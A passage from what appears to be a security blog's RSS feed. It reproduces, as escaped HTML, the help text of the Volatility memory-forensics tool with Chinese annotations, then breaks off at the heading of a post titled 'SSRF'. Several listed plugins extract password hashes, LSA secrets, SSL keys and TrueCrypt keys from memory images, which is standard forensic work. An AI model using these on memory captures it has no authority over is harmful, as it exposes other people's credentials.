class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;155&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;156&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;157&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Options:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  -h, --help            list all available options and their default values.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        Default values may be set in the configuration file&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        (/etc/volatilityrc)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  --conf-file=/home/kali/.volatilityrc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        User based configuration file&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  -d, --debug           Debug volatility&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  --plugins=PLUGINS     Additional plugin directories to use (colon separated)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  --info                Print information about all registered objects&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  --cache-directory=/home/kali/.cache/volatility&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        Directory where cache files are stored&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  --cache               Use caching&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  --tz=TZ               Sets the (Olson) timezone for displaying timestamps&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        using pytz (if installed) or tzset&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  -f FILENAME, --filename=FILENAME&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        Filename to use when opening an image&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  --profile=WinXPSP2x86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        Name of the profile to load (use --info to see a list&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        of supported profiles)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  -l LOCATION, --location=LOCATION&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        A URN location from which to load an address space&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  -w, --write           Enable write support&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  --dtb=DTB             DTB Address&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  --shift=SHIFT         Mac KASLR shift address&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  --output=text         Output in this format (support is module specific, see&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        the Module Output Options below)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  --output-file=OUTPUT_FILE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        Write output in this file&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  -v, --verbose         Verbose information&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  --physical_shift=PHYSICAL_SHIFT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        Linux kernel physical shift address&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  --virtual_shift=VIRTUAL_SHIFT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        Linux kernel virtual shift address&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  -g KDBG, --kdbg=KDBG  Specify a KDBG virtual address (Note: for 64-bit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        Windows 8 and above this is the address of&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        KdCopyDataBlock)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  --force               Force utilization of suspect profile&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  -k KPCR, --kpcr=KPCR  Specify a specific KPCR address&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  --cookie=COOKIE       Specify the address of nt!ObHeaderCookie (valid for&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        Windows 10 only)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Supported Plugin Commands:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                amcache         Print AmCache information&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                apihooks        Detect API hooks in process and kernel memory&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                atoms           Print session and window station atom tables&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                atomscan        Pool scanner for atom tables&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                auditpol        Prints out the Audit Policies from HKLM\SECURITY\Policy\PolAdtEv&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                bigpools        Dump the big page pools using BigPagePoolScanner&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                bioskbd         Reads the keyboard buffer from Real Mode memory&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                cachedump       Dumps cached domain hashes from memory&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                callbacks       Print system-wide notification routines&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                clipboard       Extract the contents of the windows clipboard&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                cmdline         Display process command-line arguments #显示命令行参数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                cmdscan         Extract command history by scanning for _COMMAND_HISTORY  #提取命令行历史记录（_COMMAND_HISTORY）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                connections     Print list of open connections [Windows XP and 2003 Only]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                connscan        Pool scanner for tcp connections&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                consoles        Extract command history by scanning for _CONSOLE_INFORMATION #提取命令行历史记录扫描_CONSOLE_INFORMATION）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                crashinfo       Dump crash-dump information&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                deskscan        Poolscaner for tagDESKTOP (desktops)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                devicetree      Show device tree&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                dlldump         Dump DLLs from a process address space&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                dlllist         Print list of loaded dlls for each process #打印进程的动态链接库列表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                driverirp       Driver IRP hook detection&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                drivermodule    Associate driver objects to kernel modules&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                driverscan      Pool scanner for driver objects&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                dumpcerts       Dump RSA private and public SSL keys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                dumpfiles       Extract memory mapped and cached files&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                dumpregistry    Dumps registry files out to disk &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                editbox         Displays information about Edit controls. (Listbox experimental.)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                envars          Display process environment variables&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                eventhooks      Print details on windows event hooks&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                evtlogs         Extract Windows Event Logs (XP/2003 only)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                filescan        Pool scanner for file objects #扫描文件对象信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                gahti           Dump the USER handle type information&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                gditimers       Print installed GDI timers and callbacks&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                gdt             Display Global Descriptor Table&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                getservicesids  Get the names of services in the Registry and return Calculated SID&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                getsids         Print the SIDs owning each process&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                handles         Print list of open handles for each process&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                hashdump        Dumps passwords hashes (LM/NTLM) from memory #转储内存中的Windows账号密码哈希&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                hibinfo         Dump hibernation file information&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                hivedump        Prints out a hive #转储注册表配置单元信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                hivelist        Print list of registry hives. #打印注册表配置单元列表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                hivescan        Pool scanner for registry hives&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                hpakextract     Extract physical memory from an HPAK file&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                hpakinfo        Info on an HPAK file&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                idt             Display Interrupt Descriptor Table&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                iehistory       Reconstruct Internet Explorer cache / history #重建IE缓存及访问历史记录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                imagecopy       Copies a physical address space out as a raw DD image&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                imageinfo       Identify information for the image  #查看镜像信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                impscan         Scan for calls to imported functions&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                joblinks        Print process job link information&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                kdbgscan        Search for and dump potential KDBG values&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                kpcrscan        Search for and dump potential KPCR values&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                ldrmodules      Detect unlinked DLLs&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                lsadump         Dump (decrypted) LSA secrets from the registry&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                machoinfo       Dump Mach-O file format information&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                malfind         Find hidden and injected code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                mbrparser       Scans for and parses potential Master Boot Records (MBRs) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                memdump         Dump the addressable memory for a process #转储进程的可寻址内存&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                memmap          Print the memory map&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                messagehooks    List desktop and thread window message hooks&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                mftparser       Scans for and parses potential MFT entries &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                moddump         Dump a kernel driver to an executable file sample&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                modscan         Pool scanner for kernel modules&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                modules         Print list of loaded modules&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                multiscan       Scan for various objects at once&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                mutantscan      Pool scanner for mutex objects&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                notepad         List currently displayed notepad text&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			   netscan #扫描网络情况&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			   objtypescan     Scan for Windows object type objects&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                patcher         Patches memory based on page scans&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                poolpeek        Configurable pool scanner plugin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                printkey        Print a registry key, and its subkeys and values #打印注册表项及其子项和值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                privs           Display process privileges&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                procdump        Dump a process to an executable file sample # 进程转储到一个可执行文件示例&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                pslist          Print all running processes by following the EPROCESS lists  #打印进程&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                psscan          Pool scanner for process objects #进程对象池扫描&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                pstree          Print process list as a tree #以树型方式打印进程列表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                psxview         Find hidden processes with various process listings #查找带有隐藏进程的所有进程列表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                qemuinfo        Dump Qemu information&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                raw2dmp         Converts a physical memory sample to a windbg crash dump&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                screenshot      Save a pseudo-screenshot based on GDI windows&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                servicediff     List Windows services (ala Plugx)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                sessions        List details on _MM_SESSION_SPACE (user logon sessions)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                shellbags       Prints ShellBags info&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                shimcache       Parses the Application Compatibility Shim Cache registry key&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                shutdowntime    Print ShutdownTime of machine from registry&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                sockets         Print list of open sockets&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                sockscan        Pool scanner for tcp socket objects&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                ssdt            Display SSDT entries&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                strings         Match physical offsets to virtual addresses (may take a while, VERY verbose)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                svcscan         Scan for Windows services&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                symlinkscan     Pool scanner for symlink objects&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                thrdscan        Pool scanner for thread objects&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                threads         Investigate _ETHREAD and _KTHREADs&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                timeliner       Creates a timeline from various artifacts in memory &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                timers          Print kernel timers and associated module DPCs&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                truecryptmaster Recover TrueCrypt 7.1a Master Keys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                truecryptpassphrase     TrueCrypt Cached Passphrase Finder&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                truecryptsummary        TrueCrypt Summary&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                unloadedmodules Print list of unloaded modules&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                userassist      Print userassist registry keys and information&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                userhandles     Dump the USER handle tables&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                vaddump         Dumps out the vad sections to a file&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                vadinfo         Dump the VAD info&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                vadtree         Walk the VAD tree and display in tree format&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                vadwalk         Walk the VAD tree&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                vboxinfo        Dump virtualbox information&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                verinfo         Prints out the version information from PE images&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                vmwareinfo      Dump VMware VMSS/VMSN information&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                volshell        Shell in the memory image&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                windows         Print Desktop Windows (verbose details)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                wintree         Print Z-Order Desktop Windows Tree&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                wndscan         Pool scanner for window stations&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                yarascan        Scan process or kernel memory with Yara signatures&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2024/04/22/SSRF/</guid>
            <title>SSRF</title>
            <link>http://example.com/2024/04/22/SSRF/</link>
            <pubDate>Mon, 22 Apr 2024 21:56:10 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;ssrf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssrf&#34;&gt;#&lt;/a&gt; SSRF&lt;/h1&gt;
